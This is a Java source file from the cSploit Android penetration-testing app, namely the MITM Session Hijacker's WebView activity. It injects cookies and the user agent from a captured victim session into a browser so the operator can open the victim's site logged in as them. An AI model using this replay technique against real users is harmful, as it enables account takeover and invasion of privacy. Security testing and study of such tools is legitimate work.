/*
 * This file is part of the dSploit.
 *
 * Copyleft of Simone Margaritelli aka evilsocket <evilsocket@gmail.com>
 *
 * dSploit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * dSploit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with dSploit.  If not, see <http://www.gnu.org/licenses/>.
 */
package org.csploit.android.plugins.mitm.hijacker;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Patterns;
import android.view.KeyEvent;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.view.View;
import android.view.Window;
import android.view.inputmethod.EditorInfo;
import android.view.inputmethod.InputMethodManager;
import android.webkit.CookieManager;
import android.webkit.CookieSyncManager;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.TextView;

import org.csploit.android.R;
import org.csploit.android.core.System;

import java.net.HttpCookie;

public class HijackerWebView extends AppCompatActivity {
  private static final String DEFAULT_USER_AGENT = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4";

  private WebSettings mSettings = null;
  private WebView mWebView = null;
  private ProgressBar mProgressBar = null;
  private EditText mURLet = null;

  @Override
  protected void onCreate(Bundle savedInstanceState) {
    SharedPreferences themePrefs = getSharedPreferences("THEME", 0);
    Boolean isDark = themePrefs.getBoolean("isDark", false);
    if (isDark)
      setTheme(R.style.DarkTheme);
    else
      setTheme(R.style.AppTheme);
    super.onCreate(savedInstanceState);
    supportRequestWindowFeature(Window.FEATURE_INDETERMINATE_PROGRESS);
    supportRequestWindowFeature(Window.FEATURE_PROGRESS);
    setTitle(System.getCurrentTarget() + " > MITM > Session Hijacker");
    setContentView(R.layout.plugin_mitm_hijacker_webview);
    getSupportActionBar().setDisplayHomeAsUpEnabled(true);

    mWebView = (WebView) findViewById(R.id.webView);
    mWebView.setScrollBarStyle(View.SCROLLBARS_INSIDE_OVERLAY);
    mProgressBar = (ProgressBar) findViewById(R.id.webprogress);
    mURLet = (EditText) findViewById(R.id.url);
    mProgressBar.setVisibility(View.GONE);
    mProgressBar.setMax(100);
    mSettings = mWebView.getSettings();

    mSettings.setJavaScriptEnabled(true);
    mSettings.setJavaScriptCanOpenWindowsAutomatically(true);
    mSettings.setBuiltInZoomControls(true);
    mSettings.setAppCacheEnabled(false);
    mSettings.setUserAgentString(DEFAULT_USER_AGENT);
    mSettings.setUseWideViewPort(true);

    mURLet.setOnEditorActionListener(new EditText.OnEditorActionListener() {
      @Override
      public boolean onEditorAction(TextView v, int actionId, KeyEvent event) {
        if (actionId == EditorInfo.IME_ACTION_DONE || actionId == EditorInfo.IME_ACTION_NEXT) {
          mWebView.loadUrl(mURLet.getText().toString());
          InputMethodManager imm = (InputMethodManager)getSystemService(Context.INPUT_METHOD_SERVICE);
          imm.hideSoftInputFromWindow(mWebView.getWindowToken(), 0);
          mWebView.requestFocus();
          return true;
        }
        return false;
      }
    });

    mURLet.setOnKeyListener(new EditText.OnKeyListener() {
      @Override
      public boolean onKey(View v, int keyCode, KeyEvent event) {
        if (event.getAction() == KeyEvent.ACTION_DOWN
                && event.getKeyCode() == KeyEvent.KEYCODE_ENTER) {
          mWebView.loadUrl(mURLet.getText().toString());
          InputMethodManager imm = (InputMethodManager)getSystemService(Context.INPUT_METHOD_SERVICE);
          imm.hideSoftInputFromWindow(mWebView.getWindowToken(), 0);
          mWebView.requestFocus();
          return true;
        }
        return false;
      }
    });

    mWebView.setWebViewClient(new WebViewClient() {
      @Override
      public boolean shouldOverrideUrlLoading(WebView view, String url) {
        view.loadUrl(url);
        mURLet.setText(url);
        return true;
      }
    });

    mWebView.setWebChromeClient(new WebChromeClient() {

      public void onProgressChanged(WebView view, int progress) {
        if ((mWebView != null) && (mURLet != null) && (progress == 0)); {
          getSupportActionBar().setSubtitle(mWebView.getUrl());
          mURLet.setText(mWebView.getUrl());
        }

        if (mProgressBar != null) {
          mProgressBar.setVisibility(View.VISIBLE);
          // Normalize our progress along the progress bar's scale

          mProgressBar.setProgress(progress);

          if (progress == 100) {
            mProgressBar.setVisibility(View.GONE);
          }
        }
      }
    });

    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
      CookieManager cm = CookieManager.getInstance();
      cm.flush();
    } else {
      CookieSyncManager.createInstance(this);
      CookieManager.getInstance().removeAllCookie();
    }

    Session session = (Session) System.getCustomData();
    if (session != null) {
      String domain = null, rawcookie = null;

      for (HttpCookie cookie : session.mCookies.values()) {
        domain = cookie.getDomain();
        rawcookie = cookie.getName() + "=" + cookie.getValue()
                + "; domain=" + domain + "; path=/"
                + (session.mHTTPS ? ";secure" : "");

        CookieManager.getInstance().setCookie(domain, rawcookie);
      }

      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
        CookieManager cm = CookieManager.getInstance();
        cm.flush();
      } else {
        CookieSyncManager.getInstance().startSync();
      }

      if (session.mUserAgent != null
              && session.mUserAgent.isEmpty() == false)
        mSettings.setUserAgentString(session.mUserAgent);

      String url = (session.mHTTPS ? "https" : "http") + "://";

      if(domain != null && !Patterns.IP_ADDRESS.matcher(domain).matches())
        url += "www.";

      url += domain;

      mWebView.loadUrl(url);
      mWebView.requestFocus();
    }
  }

  @Override
  protected void onResume() {
    super.onResume();

    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
      CookieManager cm = CookieManager.getInstance();
      cm.flush();
    } else {
      CookieSyncManager.getInstance().startSync();
    }
  }

  @Override
  protected void onPause() {
    super.onPause();

    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
      CookieManager cm = CookieManager.getInstance();
      cm.flush();
    } else {
      CookieSyncManager.getInstance().startSync();
    }
  }

  @Override
  public boolean onCreateOptionsMenu(Menu menu) {
    MenuInflater inflater = getMenuInflater();
    inflater.inflate(R.menu.browser, menu);
    return super.onCreateOptionsMenu(menu);
  }

  @Override
  public boolean onOptionsItemSelected(MenuItem item) {
    switch (item.getItemId()) {
      case android.R.id.home:

        mWebView = null;
        onBackPressed();

        return true;

      case R.id.back:

        if (mWebView.canGoBack())
          mWebView.goBack();

        return true;

      case R.id.forward:

        if (mWebView.canGoForward())
          mWebView.goForward();

        return true;

      case R.id.reload:

        mWebView.reload();

      default:
        return super.onOptionsItemSelected(item);
    }
  }

  @Override
  public void onBackPressed() {

    if (mWebView != null && mWebView.canGoBack())
      mWebView.goBack();

    else {
      if (mWebView != null)
        mWebView.stopLoading();

      super.onBackPressed();
      overridePendingTransition(R.anim.fadeout, R.anim.fadein);
    }
  }
}
